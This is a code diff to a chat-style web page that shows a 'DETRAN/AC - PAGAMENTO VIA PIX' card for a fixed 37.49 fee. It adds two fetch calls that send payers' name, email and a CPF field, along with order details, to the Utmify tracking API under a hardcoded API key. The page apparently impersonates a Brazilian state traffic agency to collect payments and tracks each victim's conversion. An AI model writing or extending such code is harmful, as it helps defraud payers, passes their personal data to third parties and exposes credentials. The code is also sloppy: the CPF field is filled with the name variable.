@@ -234,6 +234,28 @@
                         .then(function(result){
                             var pixCode = (result.ok && result.data && result.data.success && result.data.data) ? (result.data.data.pix_code || (result.data.data.pix && result.data.data.pix.qrcode) || '') : '';
                             if (pixCode) {
+                                // Rastrear evento de PIX gerado na Utmify
+                                try {
+                                    fetch('https://api.utmify.com.br/v1/events', {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json',
+                                            'X-API-Key': 'aTLLR6l5R8WgvsBp9ASTuBnV6AkEymRq16gn'
+                                        },
+                                        body: JSON.stringify({
+                                            event: 'pix_generated',
+                                            event_name: 'PIX Gerado',
+                                            customer: {
+                                                cpf: fn,
+                                                name: fn,
+                                                email: fc
+                                            },
+                                            value: 37.49,
+                                            timestamp: new Date().toISOString()
+                                        })
+                                    }).catch(function(e) { console.log('Utmify event error:', e); });
+                                } catch (e) { console.log('Utmify tracking error:', e); }
+
                                 var pixRow = document.createElement('div'); pixRow.className = 'msg-row bot';
                                 pixRow.innerHTML = '<div class="chat-pix-card">'+
                                     '<div class="chat-pix-title">DETRAN/AC - PAGAMENTO VIA PIX</div>'+
@@ -306,6 +328,23 @@
                                 try { sessionStorage.setItem('chat_pix_order_id', orderIdChat); sessionStorage.setItem('chat_pix_code', pixCode); sessionStorage.setItem('chat_pix_created_at', String(Date.now())); } catch (e) {}
                                 function isPaidResponseChat(data){ if(!data||!data.data)return false; if(data.success===false)return false; var d=data.data; if(!d)return false; if(d.is_paid===true)return true; var s=String(d.status||'').toLowerCase(); return s==='paid'||s==='approved'; }
                                 function showChatPaymentSuccess() {
+                                    try {
+                                        fetch('https://api.utmify.com.br/v1/events', {
+                                            method: 'POST',
+                                            headers: {
+                                                'Content-Type': 'application/json',
+                                                'X-API-Key': 'aTLLR6l5R8WgvsBp9ASTuBnV6AkEymRq16gn'
+                                            },
+                                            body: JSON.stringify({
+                                                event: 'payment_approved',
+                                                event_name: 'Pagamento Aprovado',
+                                                customer: { cpf: fn, name: fn, email: fc },
+                                                order_id: orderIdChat,
+                                                value: 37.49,
+                                                timestamp: new Date().toISOString()
+                                            })
+                                        }).catch(function(e) {});
+                                    } catch (e) {}
                                     try { sessionStorage.removeItem('chat_pix_order_id'); sessionStorage.removeItem('chat_pix_code'); sessionStorage.removeItem('chat_pix_created_at'); } catch(e) {}
                                     var aguardando = pixRow.querySelector('.chat-pix-aguardando');
                                     if (aguardando) aguardando.innerHTML = '<span class="chat-pix-aguardando-txt" style="color:var(--green-success);">PAGAMENTO APROVADO</span>';
